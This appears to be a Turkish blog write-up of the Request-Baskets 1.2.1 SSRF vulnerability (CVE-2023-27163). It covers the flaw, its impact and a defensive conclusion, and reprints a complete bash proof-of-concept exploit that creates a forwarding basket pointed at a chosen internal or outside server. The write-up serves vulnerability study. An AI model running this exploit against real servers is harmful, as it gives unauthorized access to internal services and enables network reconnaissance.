---
{"dg-publish":true,"permalink":"/baglantilar/mediium-request-baskets-tuerkce/"}
---

# Request-Baskets 1.2.1 Server-Side Request Forgery (CVE-2023–27163)

![Pasted image 20250111000851.png](/img/user/resimler/Pasted%20image%2020250111000851.png)

1- **Request-Baskets nedir?**  
[Request-Baskets](https://rbaskets.in/web), rastgele HTTP **request**'lerini yakalamak ve bunları bir **RESTful API** veya basit bir web **user interface** aracılığıyla incelemeyi kolaylaştırmak için tasarlanmış bir web servisidir.

Bu servis, **RequestHub** projesinin konseptlerinden ve uygulama tasarım prensiplerinden esinlenmiştir ve daha önce **RequestBin** servisi tarafından sağlanan işlevselliği yeniden oluşturur.

**2- Request-Baskets Üzerinde SSRF (CVE-2023–27163)**  
CVE-2023–27163, Request-Baskets içinde tespit edilen kritik bir **Server-Side Request Forgery (SSRF)** zafiyetidir ve 1.2.1 sürümü dahil tüm versiyonları etkiler. Bu zafiyet, kötü niyetli aktörlerin /api/baskets/{name} bileşenini dikkatle hazırlanmış **API request**'leri aracılığıyla istismar ederek yetkisiz ağ kaynaklarına ve hassas bilgilere erişim sağlamasına olanak tanır.

**3- Nasıl Çalışır?**  
Daha önce belirtildiği gibi, Request-Baskets belirli **endpoint**'lere (baskets olarak bilinir) yönlendirilen gelen HTTP **request**'leri toplamak ve kaydetmek için tasarlanmış bir **web application** olarak çalışır. Bu baskets'leri oluştururken kullanıcılar, bu **request**'lerin iletileceği alternatif **server**'ları belirleme esnekliğine sahiptir. Kritik sorun, kullanıcıların yanlışlıkla bir ağ ortamında genellikle erişim kısıtlaması bulunan servisleri belirtebilmesinde yatar.

Örneğin, bir senaryoda, sunucunun 55555 portunda Request-Baskets'i barındırdığını ve aynı zamanda 8000 portunda bir Flask **web server** çalıştırdığını düşünelim. Ancak Flask **server**, yalnızca **localhost** ile etkileşimde bulunacak şekilde yapılandırılmıştır. Bu contexde, bir saldırgan SSRF zafiyetini exploit ederek [http://localhost:8000](http://localhost:8000) adresine **request**'leri yönlendiren bir basket oluşturabilir. Böylece önceki ağ kısıtlamalarını aşarak yalnızca local erişime açık olması gereken Flask **web server**'a erişim elde edebilir.


4- Exploit script

Senaryo[ vulners web](https://vulners.com/packetstorm/PACKETSTORM:174128) sitesinden alınmıştır

```
# Exploit Title: Request-Baskets v1.2.1 - Server-side request forgery (SSRF)  
# Exploit Author: Iyaad Luqman K (init_6)  
# Application: Request-Baskets v1.2.1  
# Tested on: Ubuntu 22.04  
# CVE: CVE-2023-27163  
  
  
# PoC  
#!/bin/bash  
  
  
if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then  
help="Usage: exploit.sh <URL> <TARGET>\n\n";  
help+="Arguments:\n" \  
help+=" URL main path (/) of the server (eg. http://127.0.0.1:5000/)\n";  
help+=" TARGET";  
  
echo -e "$help";  
exit 1;  
fi  
  
URL=$1  
ATTACKER_SERVER=$2  
  
if [ "${URL: -1}" != "/" ]; then  
URL="$URL/";  
fi;  
  
BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");  
  
API_URL="$URL""api/baskets/$BASKET_NAME";  
  
PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";  
  
echo "> Creating the \"$BASKET_NAME\" proxy basket...";  
  
if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then  
echo "> FATAL: Could not properly request $API_URL. Is the server online?";  
exit 1;  
fi;  
  
BASKET_URL="$URL$BASKET_NAME";  
  
echo "> Basket created!";  
echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";  
  
if ! jq --help 1>/dev/null; then  
echo "> Response body (Authorization): $response";  
else  
echo "> Authorization: $(echo "$response" | jq -r ".token")";  
fi;  
  
exit 0;
```


**Açıklama**  
Kodun işlevlerinin bir dökümü:

1. **Argument Validation**:  
    Script, kendisine geçirilen komut satırı argümanlarının sayısını kontrol eder. Argüman sayısı 2’den azsa veya ilk argüman “-h” ya da “--help” ise, kullanım bilgilerini görüntüler ve çıkış yapar.
    
2. **Parsing Command-Line Arguments**:  
    İlk argümanı ($1) **URL** değişkenine, ikinci argümanı ($2) **ATTACKER_SERVER** değişkenine atar. Ayrıca, **URL**'nin sonunda bir **slash** ("/") olduğundan emin olarak geçerli URL'ler oluşturur.
    
3. **Generating a Random BASKET_NAME**:  
    Küçük harflerden rastgele bir dize oluşturur ve bunu **BASKET_NAME** değişkenine atar.
    
4. **Constructing API_URL and PAYLOAD**:  
    **API_URL**’yi oluşturmak için **BASKET_NAME**'i **URL**'ye ekler. Daha sonra, **ATTACKER_SERVER**'ı **forward_url** olarak içeren JSON **payload**'unu (PAYLOAD) oluşturur.
    
5. **Creating a Proxy Basket**:  
    Script, **curl** komutunu kullanarak **JSON payload**'u veri olarak **API_URL**'ye bir **HTTP POST request** gönderir. Bu, hedef sunucuda **proxy basket** oluşturur ve gelen istekleri **ATTACKER_SERVER**'a iletir.
    
6. **Handling the Response**:  
    **curl** komutunun başarılı olup olmadığını kontrol eder. Eğer başarısızsa, bir hata mesajı görüntüler ve çıkış yapar. Aksi takdirde, bir başarı mesajı ve oluşturulan **proxy basket** hakkında bilgi görüntüler.
    
7. **Using jq for JSON Parsing**:  
    Eğer **jq** aracı mevcutsa, yanıt JSON’undan "Authorization" **token**'ını çıkarmayı dener. **jq** mevcut değilse, tüm yanıt gövdesini görüntüler.
    
8. **Exit**:  
    Script, 0 durum koduyla başarıyla çıkış yapar.
    

Bu script, hedef sunucuda bir **proxy basket** oluşturur ve bu basket, istekleri saldırganın script'i **ATTACKER_SERVER**'a iletir. Saldırgan, bu durumu kullanarak hedef sunucunun rastgele hedeflere istek göndermesini sağlayabilir ve bu da hassas internal kaynakların açığa çıkmasına veya yetkisiz işlemler gerçekleştirilmesine neden olabilir.

**5- Etki**:

a- **Information Disclosure and Exfiltration**:  
Request-Baskets'deki **SSRF** zafiyeti, bilgi ifşası ve veri sızdırma riskini ciddi şekilde artırır. İlk başta yalnızca kimlik doğrulaması gerektirmeyen görsellerin yetkisiz bir şekilde ele geçirilmesi endişe kaynağı olsa da, bu durum görsellerin ötesine geçer. Hedef sunucunun local ağında **HTTP request** ile erişilebilen herhangi bir kaynak, bu exploit kullanılarak remote elde edilebilir.

b- **Unauthenticated Access to Internal Network HTTP Servers**:  
SSRF saldırısının istismarı, Request-Baskets sunucusuyla aynı ağda bağlı herhangi bir **HTTP server**'a kimlik doğrulaması olmadan erişim sağlar. Bu, yalnızca iç erişime açık olan Nginx gibi sunucular, dahili **RESTful API**'ler (NoSQL ve GraphQL veri tabanları gibi) için de geçerlidir. Önemli bir nokta, bu erişimin yalnızca local makineyle sınırlı olmamasıdır; local ağda bağlı tüm makineleri kapsar.

c- **Port and IP Scanning and Enumeration**:  
**SSRF** zafiyeti, hem internal hem de external **HTTP server**'lar için talep üzerine **port scan** yapma imkanı sunar. Ayrıca, local ağdaki açık **HTTP port**'lara sahip tüm makinelerin sayımını yapmayı sağlar. Bu yetenek, kötü niyetli aktörlere keşif yapma imkanı tanır ve ağın tüm mimarisini ve açık zafiyetlerini ortaya çıkarabilir.

**6- Sonuç**  
Bu zafiyet, yetkisiz erişimi önlemek ve web servislerinin güvenli bir şekilde çalışmasını sağlamak için doğru güvenlik kontrollerinin ve doğrulama mekanizmalarının önemini vurgular. Request-Baskets içinde keşfedilen gibi **SSRF** zafiyetlerinin inceliklerini anlamak, hem geliştiriciler hem de güvenlik profesyonelleri için kritiktir, çünkü bu durum bu tür risklerin etkili bir şekilde belirlenmesini ve azaltılmasını sağlar.




